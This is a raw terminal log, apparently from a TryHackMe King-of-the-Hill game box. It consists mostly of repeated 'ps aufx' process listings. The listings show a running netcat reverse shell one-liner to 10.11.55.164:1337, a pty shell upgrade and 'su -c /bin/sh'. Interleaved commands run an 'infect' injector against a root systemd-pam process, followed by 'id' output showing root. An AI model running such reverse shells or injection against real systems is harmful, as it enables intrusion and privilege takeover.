root        23  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kcompactd0]
root        24  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [ksmd]
root        25  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [khugepaged]
root        26  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [crypto]
root        27  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kintegrityd]
root        28  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kblockd]
root        29  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ata_sff]
root        30  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [md]
root        31  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [edac-poller]
root        32  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [devfreq_wq]
root        33  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [watchdogd]
root        36  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kswapd0]
root        37  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/u31:0]
root        38  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ecryptfs-kthrea]
root        80  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kthrotld]
root        81  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [acpi_thermal_pm]
root        82  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_0]
root        83  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_0]
root        84  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_1]
root        85  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_1]
root        91  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ipv6_addrconf]
root       100  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kstrp]
root       117  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [charger_manager]
root       167  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ttm_swap]
root       263  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [raid5wq]
root       316  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [jbd2/xvda2-8]
root       317  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ext4-rsv-conver]
root       367  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:1H]
root       399  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [iscsi_eh]
root       402  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-wq]
root       403  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-unb-wq]
root       404  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_mcast]
root       405  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_nl_sa_wq]
root       406  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [rdma_cm]
root       419  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop0]
root       421  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop1]
root      1425  0.0  0.0      0     0 ?        I    22:43   0:00  \_ [kworker/u30:2]
root      1544  0.0  0.0      0     0 ?        I    22:55   0:00  \_ [kworker/u30:1]
root      1591  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/u30:5]
root      4676  0.0  0.0      0     0 ?        I    23:06   0:00  \_ [kworker/0:2]
root      7578  0.0  0.0      0     0 ?        I    23:11   0:00  \_ [kworker/0:0]
root         1  0.2  0.8 159936  9032 ?        Ss   22:31   0:06 /sbin/init maybe-ubiquity
root       397  0.0  1.8 127776 18860 ?        S<s  22:31   0:01 /lib/systemd/systemd-journald
root       408  0.0  0.1  97708  1832 ?        Ss   22:31   0:00 /sbin/lvmetad -f
root       417  0.1  0.4  45560  4512 ?        Ss   22:31   0:03 /lib/systemd/systemd-udevd
systemd+   508  0.0  0.3 141936  3320 ?        Ssl  22:31   0:00 /lib/systemd/systemd-timesyncd
systemd+   610  0.0  0.5  80056  5180 ?        Ss   22:31   0:00 /lib/systemd/systemd-networkd
systemd+   623  0.0  0.5  70640  5288 ?        Ss   22:31   0:00 /lib/systemd/systemd-resolved
tryhack+   729  0.0  0.3 106640  3604 ?        Ssl  22:31   0:00 /home/tryhackme/img
root       743  0.0  0.6  70856  6300 ?        Ss   22:31   0:00 /lib/systemd/systemd-logind
bread      745  0.0  0.4 107104  5028 ?        Ssl  22:31   0:00 /home/bread/main
bread     1549  0.0  0.3  11616  3172 ?        S    23:00   0:00  \_ /bin/bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.55.164 1337 >/tmp/f
bread     1556  0.0  0.0   8420   808 ?        S    23:00   0:00      \_ cat /tmp/f
bread     1557  0.0  0.0   6732   900 ?        S    23:00   0:00      \_ sh -i
root      1563  0.0  0.3  19216  3900 ?        S    23:00   0:00      |   \_ -i
root      8774  0.0  0.3  37080  3368 ?        R    23:13   0:00      |       \_ ps aufx
bread     1558  0.0  0.2  17820  2216 ?        S    23:00   0:00      \_ nc 10.11.55.164 1337
syslog     747  0.0  0.4 263036  4368 ?        Ssl  22:31   0:00 /usr/sbin/rsyslogd -n
root       751  0.0  0.3  33996  3360 ?        Ss   22:31   0:00 /usr/sbin/inetd
root       753  0.0  0.1 161076  1676 ?        Ssl  22:31   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       755  0.0  1.7 169096 17148 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
daemon     756  0.0  0.2  28332  2352 ?        Ss   22:31   0:00 /usr/sbin/atd -f
message+   763  0.0  0.4  50108  4356 ?        Ss   22:31   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       788  0.0  0.6 286332  6968 ?        Ssl  22:31   0:00 /usr/lib/accountsservice/accounts-daemon
root       789  0.0  0.5 106640  5424 ?        Ssl  22:31   0:00 /root/koth
root       791  0.0  0.3  30028  3100 ?        Ss   22:31   0:00 /usr/sbin/cron -f
root       792  0.3  2.4 557680 24876 ?        Ssl  22:31   0:08 /usr/lib/snapd/snapd
root       800  0.0  1.9 185948 20096 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       809  0.0  0.2  14664  2248 ttyS0    Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root       815  0.0  0.1  14888  1904 tty1     Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       816  0.0  0.7 291456  7216 ?        Ssl  22:31   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       819  0.0  0.5  72300  5728 ?        Ss   22:31   0:00 /usr/sbin/sshd -D
root      8521  0.0  0.7 108008  7152 ?        Ss   23:12   0:00  \_ sshd: ramen [priv]
ramen     8623  0.0  0.4 108368  4948 ?        S    23:13   0:00      \_ sshd: ramen@notty
ramen     8649  0.0  0.0   6732   904 ?        Ss   23:13   0:00          \_ /bin/sh
mysql      841  0.1 17.5 1161928 176800 ?      Sl   22:32   0:03 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
ramen      956  0.0  0.7  76644  7476 ?        Ss   22:32   0:00 /lib/systemd/systemd --user
ramen      966  0.0  0.2 111792  2448 ?        S    22:32   0:00  \_ (sd-pam)
root      1575  4.7  0.0   1000    56 ?        Ss   23:00   0:35 /li
root      7342  0.0  1.3 722556 13804 ?        Ssl  23:10   0:00 /usr/bin/systemd-pam
chmod +x infect
./infect 7342
[*] SUCCESSFULLY! Injected!! [*]

id
uid=0(root) gid=0(root) groups=0(root),1004(bread)
ps aufx
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         2  0.0  0.0      0     0 ?        S    22:31   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    22:31   0:01  \_ [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [migration/0]
root        11  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [netns]
root        15  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [rcu_tasks_kthre]
root        16  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kauditd]
root        17  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenbus]
root        18  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenwatch]
root        19  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [kworker/0:1]
root        20  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [khungtaskd]
root        21  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [oom_reaper]
root        22  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [writeback]
root        23  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kcompactd0]
root        24  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [ksmd]
root        25  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [khugepaged]
root        26  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [crypto]
root        27  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kintegrityd]
root        28  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kblockd]
root        29  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ata_sff]
root        30  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [md]
root        31  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [edac-poller]
root        32  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [devfreq_wq]
root        33  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [watchdogd]
root        36  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kswapd0]
root        37  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/u31:0]
root        38  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ecryptfs-kthrea]
root        80  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kthrotld]
root        81  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [acpi_thermal_pm]
root        82  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_0]
root        83  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_0]
root        84  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_1]
root        85  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_1]
root        91  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ipv6_addrconf]
root       100  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kstrp]
root       117  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [charger_manager]
root       167  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ttm_swap]
root       263  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [raid5wq]
root       316  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [jbd2/xvda2-8]
root       317  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ext4-rsv-conver]
root       367  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:1H]
root       399  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [iscsi_eh]
root       402  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-wq]
root       403  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-unb-wq]
root       404  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_mcast]
root       405  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_nl_sa_wq]
root       406  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [rdma_cm]
root       419  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop0]
root       421  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop1]
root      1425  0.0  0.0      0     0 ?        I    22:43   0:00  \_ [kworker/u30:2]
root      1544  0.0  0.0      0     0 ?        I    22:55   0:00  \_ [kworker/u30:1]
root      1591  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/u30:5]
root      4676  0.0  0.0      0     0 ?        I    23:06   0:00  \_ [kworker/0:2]
root      7578  0.0  0.0      0     0 ?        I    23:11   0:00  \_ [kworker/0:0]
root         1  0.2  0.8 159936  9032 ?        Ss   22:31   0:06 /sbin/init maybe-ubiquity
root       397  0.0  1.8 127776 18916 ?        S<s  22:31   0:01 /lib/systemd/systemd-journald
root       408  0.0  0.1  97708  1832 ?        Ss   22:31   0:00 /sbin/lvmetad -f
root       417  0.1  0.4  45560  4512 ?        Ss   22:31   0:03 /lib/systemd/systemd-udevd
systemd+   508  0.0  0.3 141936  3320 ?        Ssl  22:31   0:00 /lib/systemd/systemd-timesyncd
systemd+   610  0.0  0.5  80056  5180 ?        Ss   22:31   0:00 /lib/systemd/systemd-networkd
systemd+   623  0.0  0.5  70640  5288 ?        Ss   22:31   0:00 /lib/systemd/systemd-resolved
tryhack+   729  0.0  0.3 106640  3604 ?        Ssl  22:31   0:00 /home/tryhackme/img
root       743  0.0  0.6  70856  6300 ?        Ss   22:31   0:00 /lib/systemd/systemd-logind
bread      745  0.0  0.4 107104  5028 ?        Ssl  22:31   0:00 /home/bread/main
bread     1549  0.0  0.3  11616  3172 ?        S    23:00   0:00  \_ /bin/bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.55.164 1337 >/tmp/f
bread     1556  0.0  0.0   8420   808 ?        S    23:00   0:00      \_ cat /tmp/f
bread     1557  0.0  0.0   6732   900 ?        S    23:00   0:00      \_ sh -i
root      1563  0.0  0.3  19216  3900 ?        S    23:00   0:00      |   \_ -i
root      8904  0.0  0.3  37080  3356 ?        R    23:13   0:00      |       \_ ps aufx
bread     1558  0.0  0.2  17820  2216 ?        S    23:00   0:00      \_ nc 10.11.55.164 1337
syslog     747  0.0  0.4 263036  4368 ?        Ssl  22:31   0:00 /usr/sbin/rsyslogd -n
root       751  0.0  0.3  33996  3360 ?        Ss   22:31   0:00 /usr/sbin/inetd
root       753  0.0  0.1 161076  1676 ?        Ssl  22:31   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       755  0.0  1.7 169096 17148 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
daemon     756  0.0  0.2  28332  2352 ?        Ss   22:31   0:00 /usr/sbin/atd -f
message+   763  0.0  0.4  50108  4356 ?        Ss   22:31   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       788  0.0  0.6 286332  6968 ?        Ssl  22:31   0:00 /usr/lib/accountsservice/accounts-daemon
root       789  0.0  0.5 106640  5424 ?        Ssl  22:31   0:00 /root/koth
root       791  0.0  0.3  30028  3100 ?        Ss   22:31   0:00 /usr/sbin/cron -f
root       792  0.3  2.4 557680 24876 ?        Ssl  22:31   0:08 /usr/lib/snapd/snapd
root       800  0.0  1.9 185948 20096 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       809  0.0  0.2  14664  2248 ttyS0    Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root       815  0.0  0.1  14888  1904 tty1     Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       816  0.0  0.7 291456  7216 ?        Ssl  22:31   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       819  0.0  0.5  72300  5728 ?        Ss   22:31   0:00 /usr/sbin/sshd -D
root      8521  0.0  0.7 108008  7152 ?        Ss   23:12   0:00  \_ sshd: ramen [priv]
ramen     8623  0.0  0.4 108368  4948 ?        S    23:13   0:00      \_ sshd: ramen@notty
ramen     8649  0.0  0.0   6732   904 ?        Ss   23:13   0:00          \_ /bin/sh
ramen     8848  0.5  0.9  38984  9724 ?        S    23:13   0:00              \_ python3 -c import pty;pty.spawn("/bin/sh")
ramen     8849  0.0  0.0   6732   824 pts/1    Ss   23:13   0:00                  \_ /bin/sh
root      8902  0.0  0.3  61792  3788 pts/1    S+   23:13   0:00                      \_ su -c /bin/sh
root      8903  0.0  0.0   6732   920 ?        Ss   23:13   0:00                          \_ /bin/sh
mysql      841  0.1 17.5 1161928 176800 ?      Sl   22:32   0:03 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
ramen      956  0.0  0.7  76644  7476 ?        Ss   22:32   0:00 /lib/systemd/systemd --user
ramen      966  0.0  0.2 111792  2448 ?        S    22:32   0:00  \_ (sd-pam)
root      1575  4.7  0.0   1000    56 ?        Ss   23:00   0:36 /li
root      8864  1.6  1.3 722556 13564 ?        Ssl  23:13   0:00 /usr/bin/systemd-pam
./infect 7342
Failed to attach to process.: No such process

ps aufx
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         2  0.0  0.0      0     0 ?        S    22:31   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    22:31   0:01  \_ [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [migration/0]
root        11  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [netns]
root        15  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [rcu_tasks_kthre]
root        16  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kauditd]
root        17  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenbus]
root        18  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenwatch]
root        19  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [kworker/0:1]
root        20  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [khungtaskd]
root        21  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [oom_reaper]
root        22  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [writeback]
root        23  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kcompactd0]
root        24  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [ksmd]
root        25  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [khugepaged]
root        26  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [crypto]
root        27  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kintegrityd]
root        28  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kblockd]
root        29  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ata_sff]
root        30  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [md]
root        31  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [edac-poller]
root        32  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [devfreq_wq]
root        33  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [watchdogd]
root        36  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kswapd0]
root        37  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/u31:0]
root        38  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ecryptfs-kthrea]
root        80  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kthrotld]
root        81  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [acpi_thermal_pm]
root        82  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_0]
root        83  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_0]
root        84  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_1]
root        85  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_1]
root        91  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ipv6_addrconf]
root       100  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kstrp]
root       117  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [charger_manager]
root       167  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ttm_swap]
root       263  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [raid5wq]
root       316  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [jbd2/xvda2-8]
root       317  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ext4-rsv-conver]
root       367  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:1H]
root       399  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [iscsi_eh]
root       402  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-wq]
root       403  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-unb-wq]
root       404  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_mcast]
root       405  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_nl_sa_wq]
root       406  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [rdma_cm]
root       419  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop0]
root       421  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop1]
root      1425  0.0  0.0      0     0 ?        I    22:43   0:00  \_ [kworker/u30:2]
root      1544  0.0  0.0      0     0 ?        I    22:55   0:00  \_ [kworker/u30:1]
root      1591  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/u30:5]
root      4676  0.0  0.0      0     0 ?        I    23:06   0:00  \_ [kworker/0:2]
root      7578  0.0  0.0      0     0 ?        I    23:11   0:00  \_ [kworker/0:0]
root         1  0.2  0.8 159936  9032 ?        Ss   22:31   0:06 /sbin/init maybe-ubiquity
root       397  0.0  1.8 127776 18936 ?        S<s  22:31   0:01 /lib/systemd/systemd-journald
root       408  0.0  0.1  97708  1832 ?        Ss   22:31   0:00 /sbin/lvmetad -f
root       417  0.1  0.4  45560  4512 ?        Ss   22:31   0:03 /lib/systemd/systemd-udevd
systemd+   508  0.0  0.3 141936  3320 ?        Ssl  22:31   0:00 /lib/systemd/systemd-timesyncd
systemd+   610  0.0  0.5  80056  5180 ?        Ss   22:31   0:00 /lib/systemd/systemd-networkd
systemd+   623  0.0  0.5  70640  5288 ?        Ss   22:31   0:00 /lib/systemd/systemd-resolved
tryhack+   729  0.0  0.3 106640  3604 ?        Ssl  22:31   0:00 /home/tryhackme/img
root       743  0.0  0.6  70856  6300 ?        Ss   22:31   0:00 /lib/systemd/systemd-logind
bread      745  0.0  0.4 107104  5028 ?        Ssl  22:31   0:00 /home/bread/main
bread     1549  0.0  0.3  11616  3172 ?        S    23:00   0:00  \_ /bin/bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.55.164 1337 >/tmp/f
bread     1556  0.0  0.0   8420   808 ?        S    23:00   0:00      \_ cat /tmp/f
bread     1557  0.0  0.0   6732   900 ?        S    23:00   0:00      \_ sh -i
root      1563  0.0  0.3  19216  3900 ?        S    23:00   0:00      |   \_ -i
root      9002  0.0  0.3  37080  3464 ?        R    23:13   0:00      |       \_ ps aufx
bread     1558  0.0  0.2  17820  2216 ?        S    23:00   0:00      \_ nc 10.11.55.164 1337
syslog     747  0.0  0.4 263036  4368 ?        Ssl  22:31   0:00 /usr/sbin/rsyslogd -n
root       751  0.0  0.3  33996  3360 ?        Ss   22:31   0:00 /usr/sbin/inetd
root       753  0.0  0.1 161076  1676 ?        Ssl  22:31   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       755  0.0  1.7 169096 17148 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
daemon     756  0.0  0.2  28332  2352 ?        Ss   22:31   0:00 /usr/sbin/atd -f
message+   763  0.0  0.4  50108  4356 ?        Ss   22:31   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       788  0.0  0.6 286332  6968 ?        Ssl  22:31   0:00 /usr/lib/accountsservice/accounts-daemon
root       789  0.0  0.5 106640  5648 ?        Ssl  22:31   0:00 /root/koth
root       791  0.0  0.3  30028  3100 ?        Ss   22:31   0:00 /usr/sbin/cron -f
root       792  0.3  2.4 557680 24876 ?        Ssl  22:31   0:08 /usr/lib/snapd/snapd
root       800  0.0  1.9 185948 20096 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       809  0.0  0.2  14664  2248 ttyS0    Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root       815  0.0  0.1  14888  1904 tty1     Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       816  0.0  0.7 291456  7216 ?        Ssl  22:31   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       819  0.0  0.5  72300  5728 ?        Ss   22:31   0:00 /usr/sbin/sshd -D
root      8521  0.0  0.7 108008  7152 ?        Ss   23:12   0:00  \_ sshd: ramen [priv]
ramen     8623  0.0  0.4 108368  4948 ?        S    23:13   0:00      \_ sshd: ramen@notty
ramen     8649  0.0  0.0   6732   904 ?        Ss   23:13   0:00          \_ /bin/sh
ramen     8848  0.1  0.9  38984  9724 ?        S    23:13   0:00              \_ python3 -c import pty;pty.spawn("/bin/sh")
ramen     8849  0.0  0.0   6732   824 pts/1    Ss   23:13   0:00                  \_ /bin/sh
root      8902  0.0  0.3  61792  3788 pts/1    S+   23:13   0:00                      \_ su -c /bin/sh
root      8903  0.0  0.0   6732   920 ?        Ss   23:13   0:00                          \_ /bin/sh
mysql      841  0.1 17.5 1161928 176800 ?      Sl   22:32   0:03 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
ramen      956  0.0  0.7  76644  7476 ?        Ss   22:32   0:00 /lib/systemd/systemd --user
ramen      966  0.0  0.2 111792  2448 ?        S    22:32   0:00  \_ (sd-pam)
root      1575  4.7  0.0   1000    56 ?        Ds   23:00   0:36 /li
root      8864  0.4  1.3 722556 13564 ?        Ssl  23:13   0:00 /usr/bin/systemd-pam
./infect 8864
[*] SUCCESSFULLY! Injected!! [*]

ps aufx
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         2  0.0  0.0      0     0 ?        S    22:31   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    22:31   0:01  \_ [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [migration/0]
root        11  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [netns]
root        15  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [rcu_tasks_kthre]
root        16  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kauditd]
root        17  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenbus]
root        18  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenwatch]
root        19  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [kworker/0:1]
root        20  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [khungtaskd]
root        21  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [oom_reaper]
root        22  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [writeback]
root        23  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kcompactd0]
root        24  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [ksmd]
root        25  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [khugepaged]
root        26  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [crypto]
root        27  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kintegrityd]
root        28  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kblockd]
root        29  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ata_sff]
root        30  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [md]
root        31  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [edac-poller]
root        32  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [devfreq_wq]
root        33  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [watchdogd]
root        36  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kswapd0]
